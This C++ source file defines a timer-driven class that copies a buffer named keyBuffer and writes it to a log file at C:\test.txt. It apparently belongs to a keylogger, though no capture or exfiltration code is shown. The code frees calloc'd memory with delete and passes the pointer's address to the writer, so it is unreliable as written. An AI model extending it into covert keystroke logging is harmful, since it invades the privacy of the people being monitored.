#include "StdAfx.h"
#include "BufferWriterProcess.h"

#define FILE_TO_LOG_IN "C:\\test.txt"

BufferWriterProcess::BufferWriterProcess(Buffer* buffer, Writer *writer)
{
	g_pBuffer = buffer;
	SetIntervall(BUFFER_WRITE_TIMER_INTERVALL);
	g_pWriter = writer;
}

BufferWriterProcess::~BufferWriterProcess(void)
{
}

void BufferWriterProcess::TimerTick()
 {
	int neededBufferSize = g_pBuffer->GetNeededBufferSize();
	TCHAR *keyBuffer = (TCHAR*) calloc(neededBufferSize,sizeof(TCHAR));

	g_pBuffer->GetBuffer(keyBuffer,neededBufferSize);
	g_pWriter->Write(&keyBuffer,neededBufferSize);

	delete keyBuffer;
}
